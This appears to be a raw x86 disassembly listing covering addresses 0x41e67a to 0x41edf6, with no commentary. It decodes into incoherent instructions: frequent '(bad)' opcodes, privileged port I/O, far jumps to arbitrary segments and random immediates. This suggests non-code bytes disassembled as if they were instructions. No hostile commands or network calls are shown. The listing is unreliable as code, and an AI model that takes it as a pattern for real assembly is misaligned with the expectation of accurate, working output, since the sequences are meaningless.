  41e67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e67b:	sub    dh,ah
  41e67d:	(bad)  
  41e67e:	pop    ecx
  41e67f:	pop    es
  41e680:	jb     0x41e6fa
  41e682:	retf   
  41e683:	pop    ss
  41e684:	mov    dh,0x5a
  41e686:	fnstcw WORD PTR [edi+0x19126ae7]
  41e68c:	mov    DWORD PTR [edx+edi*8+0x7f466ecc],eax
  41e693:	jge    0x41e6e2
  41e695:	popf   
  41e696:	add    al,0xf7
  41e698:	pop    esp
  41e699:	sub    eax,0xec28dc3b
  41e69e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e69f:	mov    cl,0x39
  41e6a1:	lea    edx,[ebx]
  41e6a3:	adc    edx,DWORD PTR [edx+0x6e]
  41e6a6:	jecxz  0x41e710
  41e6a8:	sahf   
  41e6a9:	xor    DWORD PTR [ecx],0xbe378048
  41e6af:	imul   ebx,DWORD PTR [ebp-0x23],0x7d5bcff5
  41e6b6:	sar    BYTE PTR [edi-0x785ce80d],cl
  41e6bc:	pop    ds
  41e6bd:	mov    edi,0xe10b9397
  41e6c2:	sbb    eax,0x1af646b9
  41e6c7:	xlat   BYTE PTR ds:[ebx]
  41e6c8:	adc    ebx,DWORD PTR [edx]
  41e6ca:	or     al,BYTE PTR [eax]
  41e6cc:	fstp   QWORD PTR [ecx]
  41e6ce:	loopne 0x41e73b
  41e6d0:	call   0x10b2:0x25bcac3e
  41e6d7:	or     al,0x8
  41e6d9:	(bad)  
  41e6da:	out    0x5e,al
  41e6dc:	lahf   
  41e6dd:	sbb    dh,bl
  41e6df:	in     eax,0xdf
  41e6e1:	gs add eax,0xba544413
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	in     eax,0x17
  41e6ea:	ins    BYTE PTR es:[edi],dx
  41e6eb:	and    eax,0x171503d1
  41e6f0:	and    edi,DWORD PTR [esi]
  41e6f2:	scas   al,BYTE PTR es:[edi]
  41e6f3:	mov    WORD PTR [esi+0x7fac222a],ss
  41e6f9:	mov    dl,0x8b
  41e6fb:	stos   DWORD PTR es:[edi],eax
  41e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6fd:	add    bh,BYTE PTR [ebp+0x17]
  41e700:	xchg   DWORD PTR [edi],ecx
  41e702:	ret    
  41e703:	inc    esp
  41e704:	pop    esi
  41e705:	inc    esp
  41e706:	and    eax,0x9702318e
  41e70b:	out    0x95,al
  41e70d:	jmp    0xeffd:0xed7c7a64
  41e714:	sbb    eax,0x35837c78
  41e719:	mov    BYTE PTR [edx],0xd7
  41e71c:	into   
  41e71d:	mov    esi,0xb2af2772
  41e722:	stc    
  41e723:	jl     0x41e727
  41e725:	cmp    ebx,DWORD PTR [eax+edi*8]
  41e728:	adc    BYTE PTR [edx+esi*4+0x18f8dab3],dl
  41e72f:	fldcw  WORD PTR [ebp-0x39]
  41e732:	jae    0x41e791
  41e734:	aaa    
  41e735:	divpd  xmm2,XMMWORD PTR [ecx-0x3]
  41e73a:	cld    
  41e73b:	(bad)  
  41e73c:	icebp  
  41e73d:	adc    BYTE PTR [ebx],ch
  41e73f:	mov    ds:0x11b7183d,eax
  41e744:	data16 int3 
  41e746:	retf   
  41e747:	repnz push esi
  41e749:	or     eax,0xdb5f0cae
  41e74e:	fmul   DWORD PTR [esi-0x41]
  41e751:	jmp    0x41e77e
  41e753:	ret    0xa9f4
  41e756:	push   es
  41e757:	adc    al,BYTE PTR [edx-0x4063a94e]
  41e75d:	jbe    0x41e70d
  41e75f:	mov    WORD PTR [esi+eiz*2-0x7e619c58],gs
  41e766:	mov    cl,0x59
  41e768:	and    edi,ecx
  41e76a:	repz add esp,edx
  41e76d:	pop    edx
  41e76e:	mov    eax,0x631420e6
  41e773:	not    BYTE PTR [ecx+0x26]
  41e776:	xchg   ecx,eax
  41e777:	pop    ss
  41e778:	nop
  41e779:	loope  0x41e70d
  41e77b:	and    al,0x79
  41e77d:	mov    edi,0x629b5c0f
  41e782:	and    eax,0x5550c2c2
  41e787:	dec    ebx
  41e788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e789:	inc    esp
  41e78a:	cmp    al,BYTE PTR [edi]
  41e78c:	aaa    
  41e78d:	cmp    BYTE PTR [ecx-0x51f82ebe],0xe6
  41e794:	sahf   
  41e795:	cdq    
  41e796:	cmp    cl,BYTE PTR [edx+edx*2-0x73]
  41e79a:	push   eax
  41e79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e79c:	(bad)  
  41e79d:	adc    BYTE PTR [esi-0x22],ah
  41e7a0:	or     edx,DWORD PTR [ebp-0xe69bc50]
  41e7a6:	fisubr WORD PTR [edi]
  41e7a8:	mov    DWORD PTR [ecx-0x409c3a4],ebp
  41e7ae:	jecxz  0x41e824
  41e7b0:	mov    esp,0x7511d229
  41e7b5:	repz jbe 0x6e23fcb1
  41e7bc:	push   ebx
  41e7bd:	lds    edi,FWORD PTR [edi+0x3f]
  41e7c0:	sub    ch,al
  41e7c2:	arpl   WORD PTR [ebx],bx
  41e7c4:	scas   al,BYTE PTR es:[edi]
  41e7c5:	idiv   DWORD PTR [ebp+0x14]
  41e7c8:	jo     0x41e75f
  41e7ca:	sub    esi,esi
  41e7cc:	dec    esi
  41e7cd:	stc    
  41e7ce:	ins    BYTE PTR es:[edi],dx
  41e7cf:	add    esp,ebx
  41e7d1:	addr16 fdivrp st(3),st
  41e7d4:	xor    eax,0xcf987487
  41e7d9:	lods   eax,DWORD PTR ds:[esi]
  41e7da:	mov    gs,WORD PTR [edx+0x2857ef63]
  41e7e0:	or     dh,BYTE PTR [edx]
  41e7e2:	add    eax,0x6267edd3
  41e7e7:	test   DWORD PTR [esi-0x20],edx
  41e7ea:	jnp    0x41e791
  41e7ec:	xlat   BYTE PTR ds:[ebx]
  41e7ed:	sar    ch,1
  41e7ef:	or     ebx,DWORD PTR [edx+0x56]
  41e7f2:	inc    ebp
  41e7f3:	nop
  41e7f4:	mov    bh,0x72
  41e7f6:	loopne 0x41e799
  41e7f8:	popa   
  41e7f9:	adc    ebp,DWORD PTR ds:[ecx+0x2e]
  41e7fd:	icebp  
  41e7fe:	dec    edx
  41e7ff:	iret   
  41e800:	pop    ebx
  41e801:	(bad)  
  41e803:	inc    ecx
  41e804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e805:	xchg   ecx,eax
  41e806:	cmp    DWORD PTR [esi-0x688e5f19],0x40672dc
  41e810:	addr16 push es
  41e812:	dec    edx
  41e813:	or     al,0x89
  41e815:	(bad)  
  41e816:	pusha  
  41e817:	stos   BYTE PTR es:[edi],al
  41e818:	(bad)  
  41e819:	and    ecx,DWORD PTR [ecx-0x3]
  41e81c:	test   al,0x56
  41e81e:	test   al,0x7
  41e820:	fwait
  41e821:	sub    BYTE PTR [esi+0x546c7397],dh
  41e827:	push   es
  41e828:	cdq    
  41e829:	not    DWORD PTR [ebx+ebp*4-0x6d]
  41e82d:	adc    BYTE PTR [edi+ebx*2+0x2f7f5bbe],0x9a
  41e835:	push   0xef1d097
  41e83a:	mov    ecx,edx
  41e83c:	sbb    DWORD PTR [ebp+0x7a],ebx
  41e83f:	mov    ecx,0xd533bb3d
  41e844:	retf   
  41e845:	cld    
  41e846:	fimul  DWORD PTR [ebx]
  41e848:	pop    esp
  41e849:	add    esi,DWORD PTR [edi]
  41e84b:	cmp    ebp,DWORD PTR [esi-0x1f90009a]
  41e851:	call   0x1f68:0xed00493d
  41e858:	in     eax,dx
  41e859:	out    0xa1,eax
  41e85b:	push   esi
  41e85c:	add    DWORD PTR [edi],eax
  41e85e:	aas    
  41e85f:	mov    ds:0xd0cfc8f,al
  41e864:	pop    esi
  41e865:	mov    cl,al
  41e867:	add    eax,0x3dd68487
  41e86c:	dec    esi
  41e86d:	rol    BYTE PTR [ecx-0x47],1
  41e870:	jnp    0x41e8d9
  41e872:	or     eax,0x70e9657e
  41e877:	dec    esi
  41e878:	test   al,0x3f
  41e87a:	aas    
  41e87b:	out    0x75,al
  41e87d:	rol    ecx,cl
  41e87f:	and    eax,DWORD PTR [ebp+0x785fc41e]
  41e885:	ret    
  41e886:	lds    esp,FWORD PTR [esi]
  41e888:	push   es
  41e889:	or     ecx,DWORD PTR [ecx-0x7ab161a7]
  41e88f:	inc    ecx
  41e890:	fsubrp st(7),st
  41e892:	in     eax,dx
  41e893:	cld    
  41e894:	push   es
  41e895:	sbb    cl,BYTE PTR [esp+edi*4-0x20]
  41e899:	ins    BYTE PTR es:[edi],dx
  41e89a:	je     0x41e911
  41e89c:	xchg   BYTE PTR [edi+edx*2+0x23008e7e],bh
  41e8a3:	jg     0x41e885
  41e8a5:	int3   
  41e8a6:	(bad)  [esi+0x20]
  41e8a9:	clc    
  41e8aa:	in     al,0x5
  41e8ac:	shl    BYTE PTR [ebp-0x67],1
  41e8af:	aad    0x2
  41e8b1:	cwde   
  41e8b2:	idiv   edx
  41e8b4:	dec    esp
  41e8b5:	add    al,0x3f
  41e8b7:	xlat   BYTE PTR ds:[ebx]
  41e8b8:	mov    ds:0xac2f6897,al
  41e8bd:	jge    0x41e8ad
  41e8bf:	or     BYTE PTR [edx],0x2
  41e8c2:	fnsave [ebx]
  41e8c4:	shl    DWORD PTR [eax+esi*4+0x54],0xe
  41e8c9:	call   0x6d0a0a69
  41e8ce:	sub    dl,BYTE PTR [edi]
  41e8d0:	scas   eax,DWORD PTR es:[edi]
  41e8d1:	std    
  41e8d2:	enter  0x3bc8,0x23
  41e8d6:	dec    esp
  41e8d7:	dec    ebx
  41e8d8:	cmp    eax,0xd8faf725
  41e8dd:	test   DWORD PTR ds:0x7decd31e,0xa38795ce
  41e8e7:	cmp    eax,0xeab892e5
  41e8ec:	jbe    0x41e948
  41e8ee:	loopne 0x41e895
  41e8f0:	mov    ds:0x806fed14,eax
  41e8f5:	adc    eax,0xbaa910b9
  41e8fa:	loope  0x41e910
  41e8fc:	fisub  DWORD PTR [ebp+0x8]
  41e8ff:	cwde   
  41e900:	and    eax,0x1256a06a
  41e905:	enter  0x17db,0xb4
  41e909:	or     al,0x13
  41e90b:	dec    ecx
  41e90c:	mov    ds:0x94a8af09,al
  41e911:	inc    eax
  41e912:	bound  ebp,QWORD PTR [edx]
  41e914:	repnz rcl DWORD PTR [edi+0x47],1
  41e918:	adc    ch,dh
  41e91a:	in     eax,0xfd
  41e91c:	dec    ebx
  41e91d:	(bad)  
  41e91e:	and    DWORD PTR cs:[esi+0x50],eax
  41e922:	xchg   edi,eax
  41e923:	xchg   ebx,eax
  41e924:	sar    BYTE PTR [esi-0x3a2bb21a],1
  41e92a:	pop    eax
  41e92b:	mov    bl,0xba
  41e92d:	mov    al,ds:0xc196c9fa
  41e932:	mov    ?,WORD PTR [edi+0x765d18cb]
  41e938:	sbb    al,0x5f
  41e93a:	addr16 pop esi
  41e93c:	frstor [ebx]
  41e93e:	jge    0x41e94e
  41e940:	out    0xf3,al
  41e942:	stos   BYTE PTR es:[edi],al
  41e943:	mov    ch,BYTE PTR [edi+0x169d370c]
  41e949:	push   ss
  41e94a:	mov    esi,0xcec3d74f
  41e94f:	push   ss
  41e950:	mov    ds:0x70ecdf68,al
  41e955:	stc    
  41e956:	or     al,0xb5
  41e958:	popf   
  41e959:	aam    0x26
  41e95b:	lea    esi,[ebx-0x50]
  41e95e:	and    dh,BYTE PTR [eax]
  41e960:	inc    esi
  41e961:	idiv   DWORD PTR [ebx-0x3b7874f3]
  41e967:	pop    ecx
  41e968:	loope  0x41e972
  41e96a:	cmp    al,0x8a
  41e96c:	cld    
  41e96d:	mov    dh,0x2a
  41e96f:	xor    BYTE PTR [edx-0x48f35798],bh
  41e975:	je     0x41e9c6
  41e977:	jl     0x41e980
  41e979:	iret   
  41e97a:	pop    eax
  41e97b:	retf   0x3adb
  41e97e:	mov    edx,0x6b37f2f7
  41e983:	je     0x41e9da
  41e985:	in     al,dx
  41e986:	dec    DWORD PTR [ecx+0x4ce51446]
  41e98c:	jle    0x41e947
  41e98e:	aas    
  41e98f:	cmp    BYTE PTR [edi+0x424266c4],0x45
  41e996:	mov    esi,0x1f7c2b48
  41e99b:	ror    dl,cl
  41e99d:	lock test DWORD PTR [ecx+esi*4+0x4a9504eb],esi
  41e9a5:	cdq    
  41e9a6:	fdivr  st,st(4)
  41e9a8:	(bad)  
  41e9aa:	fisubr WORD PTR [edi-0x1]
  41e9ad:	lahf   
  41e9ae:	int    0x2
  41e9b0:	jg     0x41e953
  41e9b2:	mov    al,ds:0x7992c48d
  41e9b7:	(bad)
  41e9ba:	ja     0x41e9da
  41e9bc:	xchg   ebp,eax
  41e9bd:	sub    cl,BYTE PTR [edx]
  41e9bf:	test   eax,0x634c5130
  41e9c4:	sbb    BYTE PTR [esi],ch
  41e9c6:	rol    BYTE PTR [edx+ecx*1],cl
  41e9c9:	mov    WORD PTR [ebx+edx*2],gs
  41e9cc:	and    ch,al
  41e9ce:	push   eax
  41e9cf:	je     0x41e95a
  41e9d1:	pusha  
  41e9d2:	loopne 0x41e9f1
  41e9d4:	jge    0x41e981
  41e9d6:	pop    es
  41e9d7:	sbb    eax,0xa45b531
  41e9dc:	xor    dl,ah
  41e9de:	aam    0xb4
  41e9e0:	popf   
  41e9e1:	retf   
  41e9e2:	xor    cl,dl
  41e9e4:	dec    ebx
  41e9e5:	cmp    DWORD PTR [edx],ebp
  41e9e7:	adc    eax,0x15b46fb7
  41e9ec:	push   eax
  41e9ed:	mov    bl,0x30
  41e9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9f0:	jmp    0x8eb:0x754d3254
  41e9f7:	jbe    0x41ea02
  41e9f9:	rol    DWORD PTR [esi],cl
  41e9fb:	es clc 
  41e9fd:	fbld   TBYTE PTR [edi+0x50]
  41ea00:	rol    BYTE PTR [ebx-0x8],0xc4
  41ea04:	mov    DWORD PTR [ebp+0x7b],eax
  41ea07:	inc    ebx
  41ea08:	mov    dh,0x37
  41ea0a:	(bad)
  41ea0e:	cli    
  41ea0f:	lods   eax,DWORD PTR ds:[esi]
  41ea10:	rcl    dl,1
  41ea12:	daa    
  41ea13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea14:	outs   dx,DWORD PTR ds:[esi]
  41ea15:	mov    BYTE PTR [esi+0x14],dh
  41ea18:	push   cs
  41ea19:	adc    BYTE PTR ds:0xf6f6466b,bl
  41ea1f:	into   
  41ea20:	rol    eax,1
  41ea22:	enter  0xcb26,0xc0
  41ea26:	les    ebp,FWORD PTR [ebp+esi*2+0x72]
  41ea2a:	cs mov bh,0x5a
  41ea2d:	popf   
  41ea2e:	mov    eax,ds:0xdd14b5ed
  41ea33:	xor    BYTE PTR ss:[ecx+0x23],dl
  41ea37:	call   0xa4cd154b
  41ea3c:	add    eax,0xf0463a81
  41ea41:	pusha  
  41ea42:	xchg   esp,eax
  41ea43:	scas   eax,DWORD PTR es:[edi]
  41ea44:	mov    WORD PTR [ebp+ebp*8-0x53],fs
  41ea48:	xchg   BYTE PTR [edi-0x24fc446d],ch
  41ea4e:	xchg   esp,eax
  41ea4f:	and    al,0x70
  41ea51:	sbb    BYTE PTR [esi+0x6c],ah
  41ea54:	push   edi
  41ea55:	dec    eax
  41ea56:	adc    eax,esi
  41ea58:	cmp    edi,0x27d3b707
  41ea5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea5f:	pop    esi
  41ea60:	mov    al,ds:0xba5fbc32
  41ea65:	rcr    BYTE PTR [edx+0x1de3e6c8],cl
  41ea6b:	psrad  mm3,mm2
  41ea6e:	cmp    DWORD PTR [edx],eax
  41ea70:	or     edx,DWORD PTR es:[edi]
  41ea73:	lea    ecx,[edi]
  41ea75:	sub    BYTE PTR [edi+0x11119f3d],ah
  41ea7b:	mov    al,ds:0x3e14733f
  41ea80:	jns    0x41ea4b
  41ea82:	mov    ebx,0xa655a88c
  41ea87:	dec    ebp
  41ea88:	sbb    al,0x38
  41ea8a:	fcmovbe st,st(0)
  41ea8c:	sub    dh,BYTE PTR [ecx-0x4c]
  41ea8f:	push   eax
  41ea90:	pop    ebx
  41ea91:	lds    esi,FWORD PTR [edx+ebp*8]
  41ea94:	pop    es
  41ea95:	jecxz  0x41eaa4
  41ea97:	cmp    dl,ch
  41ea99:	mov    fs,WORD PTR ds:0x19076cdc
  41ea9f:	dec    esp
  41eaa0:	nop
  41eaa1:	mov    ebx,0xc231a59f
  41eaa6:	adc    eax,0xacaa26ac
  41eaab:	iret   
  41eaac:	adc    BYTE PTR [edx-0x11c91d5e],dh
  41eab2:	cli    
  41eab3:	sub    eax,0xeeefaa4e
  41eab8:	out    dx,al
  41eab9:	adc    al,dh
  41eabb:	out    0x5,al
  41eabd:	mov    ds:0xfe1ae7f2,eax
  41eac2:	inc    ecx
  41eac3:	into   
  41eac4:	leave  
  41eac5:	jge    0x41eb1d
  41eac7:	and    eax,0x5b88d266
  41eacc:	addr16 inc ecx
  41eace:	lods   al,BYTE PTR ds:[esi]
  41eacf:	scas   al,BYTE PTR es:[edi]
  41ead0:	push   ecx
  41ead1:	push   es
  41ead2:	xor    ebp,ebx
  41ead4:	cs sub edx,ebx
  41ead7:	push   ecx
  41ead8:	imul   ebp,DWORD PTR ds:0x1d38c97b,0x1d
  41eadf:	lds    edx,FWORD PTR [ebp-0x15]
  41eae2:	xchg   esi,eax
  41eae3:	or     ah,ch
  41eae5:	sbb    eax,0xadd71577
  41eaea:	das    
  41eaeb:	mov    edi,0xe1f7d878
  41eaf0:	or     eax,0xd342f4f0
  41eaf5:	ret    
  41eaf6:	inc    eax
  41eaf7:	shl    BYTE PTR [edi-0x6b],cl
  41eafa:	add    DWORD PTR [ecx+0x63329301],esi
  41eb00:	(bad)  
  41eb01:	sub    ch,BYTE PTR [esi]
  41eb03:	int3   
  41eb04:	sbb    ebx,0x28
  41eb07:	lods   al,BYTE PTR ds:[esi]
  41eb08:	sub    al,0x4e
  41eb0a:	mov    al,ds:0x5a9fd36c
  41eb0f:	cmp    DWORD PTR [esi+0x6e],ebx
  41eb12:	sub    eax,0xb6a4c6e8
  41eb17:	jno    0x41eafb
  41eb19:	pop    es
  41eb1a:	adc    BYTE PTR [ebx+0x54],bl
  41eb1d:	adc    bl,BYTE PTR [edx+0x3b0ba9f9]
  41eb23:	jge    0x41eae4
  41eb25:	mov    eax,0xba15b52f
  41eb2a:	inc    esp
  41eb2b:	push   0x46
  41eb2d:	mov    eax,0x6e997c0f
  41eb32:	and    BYTE PTR [edi-0x39c37241],bh
  41eb38:	scas   al,BYTE PTR es:[edi]
  41eb39:	test   BYTE PTR [ebp-0x69],0x5b
  41eb3d:	pop    ss
  41eb3e:	mov    ebx,0xe094982a
  41eb43:	fwait
  41eb44:	pop    es
  41eb45:	mov    ebx,0x3b76103b
  41eb4a:	daa    
  41eb4b:	jb     0x41eb7c
  41eb4d:	push   ss
  41eb4e:	xchg   ebp,eax
  41eb4f:	jae    0x41eb9f
  41eb51:	cmp    BYTE PTR [ecx],ah
  41eb53:	cmp    eax,0x31cf4285
  41eb58:	scas   eax,DWORD PTR es:[edi]
  41eb59:	adc    cl,BYTE PTR [edx-0x286bdc24]
  41eb5f:	out    dx,al
  41eb60:	dec    ecx
  41eb61:	mov    BYTE PTR [eax],0xad
  41eb64:	rcr    BYTE PTR [ebx],0x9
  41eb67:	and    DWORD PTR ds:0x8e103c91,edi
  41eb6d:	sbb    DWORD PTR [edi-0x6c660b37],ebx
  41eb73:	mov    esp,0xdf23b79c
  41eb78:	in     eax,0xaf
  41eb7a:	cli    
  41eb7b:	fwait
  41eb7c:	shl    BYTE PTR [ecx-0x1c82723f],cl
  41eb82:	cmp    cl,BYTE PTR [ebx]
  41eb84:	aas    
  41eb85:	or     bl,BYTE PTR [edi+0x1c]
  41eb88:	loope  0x41eb17
  41eb8a:	xchg   edi,eax
  41eb8b:	jmp    0x3c65eee4
  41eb90:	out    dx,eax
  41eb91:	pop    esp
  41eb92:	popa   
  41eb93:	outs   dx,DWORD PTR ds:[esi]
  41eb94:	into   
  41eb95:	mov    edi,DWORD PTR [eax-0x60]
  41eb98:	outs   dx,BYTE PTR ds:[esi]
  41eb99:	add    dl,0x26
  41eb9c:	push   eax
  41eb9d:	xchg   dl,ch
  41eb9f:	call   0x83914663
  41eba4:	fstp   QWORD PTR [eax]
  41eba6:	push   ebx
  41eba7:	clc    
  41eba8:	in     al,dx
  41eba9:	mov    eax,0x5f809d66
  41ebaf:	outs   dx,BYTE PTR ds:[esi]
  41ebb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebb1:	push   esi
  41ebb2:	jg     0x41ebc6
  41ebb4:	and    DWORD PTR [eax],eax
  41ebb6:	mov    WORD PTR [edx],cs
  41ebb8:	arpl   WORD PTR [esp+ecx*4-0x4882f8d4],ax
  41ebbf:	(bad)  
  41ebc0:	mov    esp,0xb1e8584
  41ebc5:	cmp    ecx,ebx
  41ebc7:	lahf   
  41ebc8:	xchg   BYTE PTR [esi-0x482f9e1e],al
  41ebce:	push   esp
  41ebcf:	and    BYTE PTR [eax-0x13],cl
  41ebd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd3:	dec    ebp
  41ebd4:	popf   
  41ebd5:	or     BYTE PTR [edx-0x56a6c9e3],dl
  41ebdb:	fisttp QWORD PTR [ecx]
  41ebdd:	fisubr DWORD PTR ds:0x4798210e
  41ebe3:	jecxz  0x41eba6
  41ebe5:	imul   ecx,DWORD PTR [esp+edx*8+0x8aebfee],0xffffffa4
  41ebed:	iret   
  41ebee:	cli    
  41ebef:	imul   DWORD PTR [ecx-0x3]
  41ebf2:	jb     0x41eb97
  41ebf4:	jmp    0xfe5dd9f8
  41ebf9:	jns    0x41ebad
  41ebfb:	rol    DWORD PTR [esi+0x4a],1
  41ebfe:	addr16 mov edx,0x49c1725f
  41ec04:	in     al,dx
  41ec05:	in     al,0x17
  41ec07:	fbstp  TBYTE PTR [ecx-0x16]
  41ec0a:	adc    BYTE PTR [ebp-0x25],0x3e
  41ec0e:	mov    ss,WORD PTR [ecx]
  41ec10:	retf   
  41ec11:	imul   ecx,DWORD PTR [ebx],0x3ae3aab
  41ec17:	lock mov bl,0x89
  41ec1a:	int    0xb5
  41ec1c:	bound  ecx,QWORD PTR [edi]
  41ec1e:	aaa    
  41ec1f:	fdivr  st(5),st
  41ec21:	or     BYTE PTR [edi+0x5b],0x4d
  41ec25:	scas   eax,DWORD PTR es:[edi]
  41ec26:	add    eax,0x874704db
  41ec2b:	fadd   QWORD PTR [ebx+0x65d1672e]
  41ec31:	mov    ch,0x9f
  41ec33:	out    0x4,al
  41ec35:	daa    
  41ec36:	popa   
  41ec37:	pop    ebp
  41ec38:	mov    ah,0x19
  41ec3a:	inc    esi
  41ec3b:	jmp    0x41ec35
  41ec3d:	pop    ecx
  41ec3e:	adc    eax,DWORD PTR [ecx+ebx*1]
  41ec41:	jo     0x41ec05
  41ec43:	ret    
  41ec44:	xor    DWORD PTR [ebp-0x3c749dd6],ecx
  41ec4a:	cmp    DWORD PTR [esi],ebp
  41ec4c:	jo     0x41ebe5
  41ec4e:	lock or BYTE PTR [ecx-0x59],dl
  41ec52:	ds ret 0x939f
  41ec56:	ret    
  41ec57:	clc    
  41ec58:	push   ss
  41ec59:	xchg   ebp,eax
  41ec5a:	test   al,0x25
  41ec5c:	mov    edi,0x4d9e0ecc
  41ec61:	mov    edi,0x53de389a
  41ec66:	sahf   
  41ec67:	xchg   DWORD PTR [eax+edx*8+0x47969f9f],ecx
  41ec6e:	push   0x8e37ad14
  41ec73:	xchg   ebx,eax
  41ec74:	fdiv   QWORD PTR ds:0x7437f859
  41ec7a:	lds    esi,FWORD PTR [esi-0x68]
  41ec7d:	jle    0x41ec13
  41ec7f:	mov    ch,0x45
  41ec81:	jmp    0x51b3:0x3ea5ff6e
  41ec88:	int3   
  41ec89:	adc    ebx,edx
  41ec8b:	inc    edi
  41ec8d:	sub    esi,DWORD PTR [ebp+0x389530e0]
  41ec93:	inc    esi
  41ec94:	sbb    al,BYTE PTR [ebp-0x5259178b]
  41ec9a:	sar    BYTE PTR [ecx-0x7b36370b],cl
  41eca0:	mov    al,0x94
  41eca2:	or     ch,BYTE PTR [eax-0x62]
  41eca5:	rol    BYTE PTR [ebx+0x2e46e56d],0xef
  41ecac:	dec    eax
  41ecad:	rcl    BYTE PTR [ecx-0x29],cl
  41ecb0:	or     DWORD PTR [ecx],esp
  41ecb2:	fisttp WORD PTR [ebp-0x6c]
  41ecb5:	and    al,0x93
  41ecb7:	mov    ebp,0x6b5f6607
  41ecbc:	mov    esp,DWORD PTR [esi+0x28]
  41ecbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecc0:	sbb    al,0xb7
  41ecc2:	js     0x41ec5a
  41ecc4:	mov    eax,0x99910db1
  41ecc9:	cs and dl,bh
  41eccc:	pop    edx
  41eccd:	dec    ebx
  41ecce:	pop    DWORD PTR [ecx-0x64]
  41ecd1:	std    
  41ecd2:	xor    BYTE PTR [ebp+ebx*2-0x72],ah
  41ecd6:	(bad)  
  41ecd7:	hlt    
  41ecd8:	lahf   
  41ecd9:	cld    
  41ecda:	fist   DWORD PTR [eax-0x63a012e1]
  41ece0:	mov    edx,0x7d3606cb
  41ece5:	sub    esp,DWORD PTR [eax+0x28f850ee]
  41eceb:	jecxz  0x41ec9d
  41eced:	adc    dh,BYTE PTR [ecx+0x70bfeea3]
  41ecf3:	jp     0x41ec95
  41ecf5:	call   0xb84da0a
  41ecfa:	aaa    
  41ecfb:	sbb    al,0x40
  41ecfd:	dec    edi
  41ecfe:	mov    ds:0x3a77ece7,al
  41ed03:	cmp    eax,0xee3a2ad6
  41ed08:	mov    ah,0x2c
  41ed0a:	sbb    DWORD PTR [edx],ebp
  41ed0c:	fmul   DWORD PTR [esi]
  41ed0e:	inc    eax
  41ed0f:	or     BYTE PTR [esi+0x23a8d4e1],0x6a
  41ed16:	pop    edi
  41ed17:	cmp    ch,cl
  41ed19:	js     0x41ecbb
  41ed1b:	push   edi
  41ed1c:	stc    
  41ed1d:	pop    ecx
  41ed1e:	jp     0x41ecdf
  41ed20:	(bad)  
  41ed21:	loope  0x41ed74
  41ed23:	adc    DWORD PTR [edx+0xe53167e],ebx
  41ed29:	jmp    0xecd9:0x1e004a68
  41ed30:	rcl    DWORD PTR [edx+0x6e7e9992],cl
  41ed36:	stos   DWORD PTR es:[edi],eax
  41ed37:	iretw  
  41ed39:	mov    al,ds:0x44cd895c
  41ed3e:	jo     0x41ed2c
  41ed40:	cmovp  ecx,DWORD PTR [edx+ebp*8]
  41ed44:	cld    
  41ed45:	mov    dh,0x6f
  41ed47:	add    al,BYTE PTR [edx-0x1bcefa42]
  41ed4d:	or     al,0x56
  41ed4f:	mov    ebx,0xd26f95ae
  41ed54:	inc    esi
  41ed55:	arpl   WORD PTR [edi],cx
  41ed57:	dec    edi
  41ed58:	leave  
  41ed59:	xchg   edi,eax
  41ed5a:	xchg   esp,eax
  41ed5b:	mov    esp,0x65f9a43
  41ed60:	stos   DWORD PTR es:[edi],eax
  41ed61:	pop    ds
  41ed62:	stos   DWORD PTR es:[edi],eax
  41ed63:	ins    DWORD PTR es:[edi],dx
  41ed64:	mov    ds:0xe47e01f2,eax
  41ed69:	sar    BYTE PTR [ecx],0x19
  41ed6c:	aas    
  41ed6d:	and    BYTE PTR [ebp-0x1d81943],al
  41ed73:	data16 ja 0x41ed96
  41ed76:	xor    esp,DWORD PTR [ebx]
  41ed78:	stos   DWORD PTR es:[edi],eax
  41ed79:	jmp    FWORD PTR [ecx]
  41ed7b:	and    DWORD PTR [esi-0x8],esp
  41ed7e:	aam    0xd
  41ed80:	(bad)  
  41ed81:	push   edi
  41ed82:	pop    ss
  41ed83:	ins    BYTE PTR es:[edi],dx
  41ed84:	data16 aam 0xa7
  41ed87:	xor    al,0xf4
  41ed89:	add    eax,0x1ce76e41
  41ed8e:	and    eax,0x6442485
  41ed93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed94:	inc    edi
  41ed95:	sub    DWORD PTR [edi-0x3f16827a],esp
  41ed9b:	aad    0x47
  41ed9d:	dec    eax
  41ed9e:	aam    0xe9
  41eda0:	lods   al,BYTE PTR ds:[esi]
  41eda1:	(bad)  [esi+eiz*1-0x28]
  41eda5:	inc    edi
  41eda6:	mov    bh,0x38
  41eda8:	adc    BYTE PTR [eax-0x5d504388],dh
  41edae:	test   bl,bh
  41edb0:	imul   edx,DWORD PTR [edx],0x7a87b61e
  41edb6:	dec    ecx
  41edb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb8:	dec    esp
  41edb9:	and    al,BYTE PTR [edi+0x768fd7e9]
  41edbf:	mul    DWORD PTR ds:0x30c8e5d5
  41edc5:	scas   al,BYTE PTR es:[edi]
  41edc6:	pop    edi
  41edc7:	pop    eax
  41edc8:	xor    BYTE PTR [ecx-0x68d8c9b4],al
  41edce:	push   eax
  41edcf:	mul    bh
  41edd1:	lods   al,BYTE PTR ds:[esi]
  41edd2:	iret   
  41edd3:	push   edi
  41edd4:	neg    DWORD PTR [ecx+0x2afe4a71]
  41edda:	jae    0x41ee29
  41eddc:	push   ebx
  41eddd:	out    0x47,eax
  41eddf:	(bad)  
  41ede1:	loop   0x41edee
  41ede3:	(bad)  
  41ede4:	mov    ds:0x2ced297,eax
  41ede9:	iret   
  41edea:	data16 adc BYTE PTR [edi+eiz*8+0x1bb0941e],0xb0
  41edf3:	ret    0xa1d5
  41edf6:	and    BYTE PTR [ebx+0x1523c58c],0xce
